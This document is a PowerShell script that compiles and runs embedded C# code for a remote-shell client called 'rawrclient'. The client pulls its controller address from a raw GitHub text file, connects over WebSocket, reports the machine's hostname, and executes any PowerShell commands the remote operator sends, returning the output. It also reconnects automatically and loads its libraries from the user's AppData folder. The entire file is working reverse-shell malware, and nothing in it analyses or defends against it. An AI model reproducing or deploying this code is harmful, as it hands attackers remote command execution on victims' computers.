$script = @"
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;
using WebSocketSharp;

namespace rawrclient {
    public class Program {
        static bool connected = false;

        static string GetPSOutput(Collection<PSObject> results, bool isLocation = false) {
            StringBuilder stringBuilder = new StringBuilder();
            foreach(PSObject psobj in results) {
                if (isLocation) {
                    stringBuilder.Append(psobj.ToString());
                }
                else {
                    stringBuilder.AppendLine(psobj.ToString());
                }
            }
            return stringBuilder.ToString();
        }

        static void SendCommand(WebSocket ws, Runspace rn, Pipeline pipe, string script) {
            string toSend = "--SHELL--||||";
            string status = "success";
            pipe = rn.CreatePipeline();
            if(script != "" && script != "clear") {
                try {
                    pipe.Commands.AddScript(script);
                    pipe.Commands.Add("Out-String");
                    toSend += GetPSOutput(pipe.Invoke());
                    pipe = rn.CreatePipeline();
                } catch (Exception ex) {
                    pipe = rn.CreatePipeline();
                    toSend += "\n" + ex.Message + "\n\n";
                    status = "error";
                }
            }
            pipe.Commands.AddScript('\u0024' + "gl69penis=Get-Location; " + '\u0024' + "gl69penis.Path");
            pipe.Commands.Add("Out-String");
            toSend += ("[PS] <" + GetPSOutput(pipe.Invoke(), true).Trim() + "> ||||" + status);
            ws.Send(toSend);
        }

        static void HandleConnection(WebSocket ws) {
            Runspace runspace = null;
            Pipeline pipeline = null;
            ws.OnMessage += (sender, e) => {
                if (e.Data == "--CONFIRM--") {
                    ws.Send("--CONFIRM--||||Confirmed > " + System.Net.Dns.GetHostName().ToString());
                }
                else if (e.Data == "--GET-SHELL--") {
                    runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(("cd " + '\u0024' + "home"));
                    Collection<PSObject> results = pipeline.Invoke();
                    SendCommand(ws, runspace, pipeline, "");
                } else if (e.Data == "--TERMINATE--") {
                    Environment.Exit(0);
                } else {
                    string[] splt = e.Data.Split(new[] { "||||" }, StringSplitOptions.None);
                    string msgEvent = splt[0];
                    string command = splt[1];
                    if (msgEvent == "--SHELL--") {
                        SendCommand(ws, runspace, pipeline, command);
                    }
                }
            };
            ws.OnClose += (s, e) => {
                connected = false;
                AttemptConnection();
            };
            ws.Connect();
            Console.ReadKey();
        }

        static void AttemptConnection() {
            while (!connected) {
                // Obtain address via shell
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                Pipeline pipe = runspace.CreatePipeline();
                pipe.Commands.AddScript('\u0024' + "fulladdress = IWR -Uri https://raw.githubusercontent.com/Mangio621/PenTesting123/master/rawr/rawraddr.txt; " + '\u0024' + "fulladdress = " + '\u0024' + "fulladdress.Content; " + '\u0024' + "fulladdress");
                pipe.Commands.Add("Out-String");
                string addr = GetPSOutput(pipe.Invoke(), false).Trim();
                runspace = null;
                pipe = null;
                var ws = new WebSocket("ws://" + addr);
                System.Threading.Thread.Sleep(3000);
                ws.OnOpen += (s, e) => {
                    connected = true;
                };
                HandleConnection(ws);
            }
        }

        public static void Main() {
            AttemptConnection();
        }
    }
}
"@;

$relpath = Get-Location;
$relpath = $relpath.Path;
if($relpath -ne ($env:APPDATA + "\rawr")) {
	$relpath = $env:APPDATA + "\rawr";
};
$sharppath = $relpath + "\websocket-sharp.dll";
$automationpath = $relpath + "\System.Management.Automation.dll";
Add-Type -Path $sharppath;
Add-Type -Path $automationpath;
$assemblies = ("websocket-sharp", "System.Management.Automation");
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $script -Language CSharp;
[rawrclient.Program]::Main();